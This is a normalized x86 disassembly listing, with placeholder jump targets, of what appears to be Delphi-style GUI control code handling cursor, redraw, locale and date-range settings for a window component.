mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff9
call sub_46657c
push eax
call SetCursor
jmp r-xdata
sub_437b8c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
sub eax 0x210
je r-xdata
mov eax [ ebx ]
sub eax 0x200
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xffff
dec eax
jne r-xdata
sub eax 0x11f1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
or eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x50 ] eax
xor eax eax
push ebp
push sub_437c01
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ccf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
not edx
and edx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] edx
retn
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ccf0
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4372e4
mov [ ebx ] 0x1400
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_448d2c
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
sub_437c50
push ebx
push esi
push edi
push ebp
mov ebx eax
mov eax ebx
call sub_44e810
mov esi [ ebx + 0x210 ]
test esi esi
je r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax esi
call sub_419080
mov edi eax
dec edi
test edi edi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x405
push 0x0
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call RedrawWindow
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x210 ]
call sub_4361b0
mov si 0xfffd
call sub_40348c
inc ebp
dec edi
jne r-xdata
sub_437cb8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x210 ]
call sub_43617c
test eax eax
je r-xdata
mov eax [ ebx + 0x210 ]
call sub_436170
mov edx [ esi + 0x4 ]
call sub_436058
jmp r-xdata
call sub_403290
sub_437d14
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
test [ ebx + 0x50 ] 0x4
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e710
lea edx [ esp + 0x4 ]
mov eax [ esi + 0x8 ]
call sub_406b4c
lea edx [ esp + 0x4 ]
mov ecx esp
mov eax ebx
call sub_437750
test al 0x3
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
sub_437d58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e974
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ esi ] 0x15
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_437d94
push ebx
mov ebx eax
mov eax ebx
call sub_44e97c
mov eax ebx
call sub_4366d8
mov edx eax
mov eax [ ebx + 0x21c ]
call sub_4239a4
mov eax ebx
call sub_436728
mov [ ebx + 0x220 ] eax
pop ebx
retn
sub_437de0
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ edx + 0x8 ]
cmp [ eax + 0x8 ] 0xfffffcc1
jne r-xdata
pop esi
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_436c78
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_436cb8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
call sub_437060
mov eax [ ebp - 0x4 ]
call sub_436c68
xor eax eax
push ebp
push sub_437e67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_436c70
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_40348c
sub_437e90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_419080
mov edi eax
dec edi
test edi edi
jl r-xdata
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x214 ] 0x1
jne r-xdata
test [ ebx + 0x40 ] 0x7fffffff
je r-xdata
mov eax ebx
call sub_435ecc
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
dec eax
add eax eax
add [ ebp - 0x4 ] eax
inc [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_437478
add [ ebp - 0x4 ] eax
cmp [ ebx + 0xd ] 0x0
jne r-xdata
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_4361b0
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x43 ] 0x80
je r-xdata
sub_437f40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_436c78
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_419080
test eax eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x235 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x235 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4366d4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4366d4
sub al 0x3
jae r-xdata
mov bl 0x1
push ebp
call sub_437e90
pop ecx
mov edi eax
mov eax [ ebp - 0x4 ]
add edi [ eax + 0x48 ]
mov eax [ ebp - 0x4 ]
call sub_4484f8
sub edi eax
mov [ esi ] edi
jmp r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov bl 0x1
push ebp
call sub_437e90
pop ecx
mov esi eax
mov eax [ ebp - 0x4 ]
add esi [ eax + 0x4c ]
mov eax [ ebp - 0x4 ]
call sub_44853c
sub esi eax
mov [ edi ] esi
sub_438008
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_449ca8
mov edx esi
mov eax ebx
call sub_44d0c0
pop esi
pop ebx
retn
sub_43802c
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xff000005
mov [ eax + 0xc ] 0xff000008
mov [ eax + 0x10 ] 0xff000002
mov [ eax + 0x14 ] 0xffffff
mov [ eax + 0x18 ] 0xffffff
mov [ eax + 0x1c ] 0xff000013
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_43807c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43816d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40426c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031e0
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ esi + 0x18 ] edx
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438174
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_438188
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
cmp eax 0x5
ja r-xdata
mov eax [ ebx + 0x4 ]
call sub_44f5e0
test al al
je r-xdata
jmp [ eax * 4 + jump_table_43819f ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4232e0
mov ecx eax
mov edx [ esi * 4 + rw-data ]
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd8 ]
mov [ ebx + 0x8 ] edi
jmp r-xdata
mov [ ebx + 0xc ] edi
jmp r-xdata
mov [ ebx + 0x10 ] edi
jmp r-xdata
mov [ ebx + 0x14 ] edi
jmp r-xdata
mov [ ebx + 0x18 ] edi
jmp r-xdata
mov [ ebx + 0x1c ] edi
sub_438200
push ebx
mov ebx eax
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
call sub_438188
mov ecx [ ebx + 0xc ]
mov edx 0x1
mov eax ebx
call sub_438188
mov ecx [ ebx + 0x10 ]
mov edx 0x2
mov eax ebx
call sub_438188
mov ecx [ ebx + 0x14 ]
mov edx 0x3
mov eax ebx
call sub_438188
mov ecx [ ebx + 0x18 ]
mov edx 0x4
mov eax ebx
call sub_438188
mov ecx [ ebx + 0x1c ]
mov edx 0x5
mov eax ebx
call sub_438188
pop ebx
retn
sub_43825c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x100
call sub_434180
mov ecx esi
xor edx edx
mov eax edi
call sub_44b008
mov [ edi + 0x245 ] 0x1
mov [ edi + 0x246 ] 0x1
mov eax [ r-xdata ]
mov [ edi + 0x50 ] eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43802c
mov [ edi + 0x208 ] eax
call sub_4099e4
fstp [ edi + 0x210 ]
fwait
mov [ edi + 0x220 ] 0x7
mov [ edi + 0x230 ] 0x1f
mov [ edi + 0x240 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4382f8
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b12c
mov eax [ esi + 0x208 ]
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_43832c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43842d
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438434
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40402c
retn
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40a670
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b7cc
call sub_403a44
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0x14 ]
call sub_40a670
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b7cc
call sub_403a44
sub_438440
push ebx
mov ebx eax
mov eax ebx
call sub_44c294
mov eax [ ebx + 0x208 ]
call sub_438200
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_438a64
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_4388ac
mov edx [ ebx + 0x240 ]
mov eax ebx
call sub_4389e8
mov dl [ ebx + 0x220 ]
mov eax ebx
call sub_438758
cmp [ ebx + 0x244 ] 0x0
je r-xdata
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_438648
pop ebx
retn
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_438bb4
pop ebx
retn
sub_4384dc
xor edx edx
mov dl [ eax + 0x245 ]
mov edx [ edx * 4 + rw-data ]
or edx 0x1
xor ecx ecx
mov cl [ eax + 0x246 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x247 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0x244 ]
or edx [ eax * 4 + rw-data ]
mov eax edx
retn
sub_438590
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x214 ]
push [ eax + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_409a34
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
xor eax eax
push ebp
push sub_438615
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
call sub_402aa8
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
fild [ ebp - 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_438648
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_438648
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_40990c
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_438bb4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x214 ] eax
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
sub_4386d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
call sub_402aa8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0x218 ]
call sub_402aa8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fcomp [ ebp - 0x8 ]
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebp - 0x8 ]
fadd [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
mov eax ebx
call sub_438560
add esp 0xfffffff8
fstp [ esp ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax ebx
call sub_438bb4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_438758
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_44f5e0
test al al
je r-xdata
mov [ esi + 0x220 ] bl
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x7
jne r-xdata
mov edi ebx
and edi 0x7f
push 0x2
lea eax [ esp + 0x4 ]
push eax
push 0x100c
push 0x400
call GetLocaleInfoA
movzx edi [ esp ]
sub edi 0x30
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx edi
call sub_4297b0
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
sub_4387c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_438898
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x228 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43889f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_438a64
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x228 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x22c ] eax
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0xc ]
call sub_40a670
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b7cc
call sub_403a44
sub_4388ac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_42974c
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
sub_4388fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4389d4
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4389db
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_438a64
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x238 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x23c ] eax
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40a670
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40b7cc
call sub_403a44
sub_4389e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov [ ebx + 0x240 ] esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_4297dc
sub_438a24
cmp dl [ eax + 0x244 ]
je r-xdata
retn
mov [ eax + 0x244 ] dl
test dl dl
je r-xdata
xor edx edx
mov [ eax + 0x218 ] edx
mov [ eax + 0x21c ] edx
mov edx [ eax + 0x210 ]
mov [ eax + 0x218 ] edx
mov edx [ eax + 0x214 ]
mov [ eax + 0x21c ] edx
jmp r-xdata
call sub_44c87c
sub_438a64
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov ebx eax
xor esi esi
fld [ ebp + 0x10 ]
call sub_402aa8
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
fld [ ebp + 0x8 ]
call sub_402aa8
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fld [ ebx + 0x210 ]
call sub_402aa8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fld [ ebx + 0x218 ]
call sub_402aa8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
je r-xdata
cmp [ ebp - 0x18 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_438590
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea ecx [ ebp - 0x40 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
jne r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_438590
jmp r-xdata
or esi 0x1
fild [ ebp - 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x40 ]
call sub_40990c
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_4386d0
jmp r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
or esi 0x2
fild [ ebp - 0x20 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x30 ]
call sub_40990c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_4386d0
jmp r-xdata
sub_438bb4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
call sub_40990c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_40990c
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_438648
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x214 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x218 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x21c ] eax
mov eax ebx
call sub_44f2dc
lea edx [ ebp - 0x20 ]
call sub_429764
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
sub_438cc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
mov [ esi + 0x20c ] eax
xor edx edx
mov eax esi
call sub_43825c
mov edx 0xbf
mov eax esi
call sub_4482b0
mov edx 0x9a
mov eax esi
call sub_4482d4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_438d18
push ebx
mov ebx eax
mov eax ebx
call sub_44e838
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x5
mov eax ebx
call sub_449ca8
sub_438d40
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov ecx [ esi + 0x8 ]
mov edx ecx
mov eax edx
mov eax [ eax + 0x8 ]
sub eax 0xfffffd13
je r-xdata
lea edi [ ecx + 0xc ]
mov eax edi
call sub_438cb0
test al al
jne r-xdata
sub eax 0x2
je r-xdata
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax edi
call sub_40994c
fstp [ ebx + 0x210 ]
fwait
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x1c ]
shl edx 0x2
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x20 ]
xor ecx ecx
call sub_402ca4
cmp [ ebx + 0x24a ] 0x0
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
lea edi [ eax + 0x1c ]
mov eax edi
call sub_438cb0
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x20 ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x1c ]
dec eax
test eax eax
jl r-xdata
jmp r-xdata
mov eax edi
call sub_40994c
fstp [ ebx + 0x218 ]
fwait
inc eax
mov [ esp + 0xc ] eax
mov [ esp ] 0x0
mov edx [ esp + 0x4 ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
add [ esp + 0x4 ] 0x4
inc [ esp ]
dec [ esp + 0xc ]
jne r-xdata
sub eax 0xc
mov eax [ esp + 0x8 ]
movzx eax [ eax + 0xe ]
add eax [ esp ]
cmp eax 0xc
jle r-xdata
jmp r-xdata
sub_438e50
push ebp
mov ebp esp
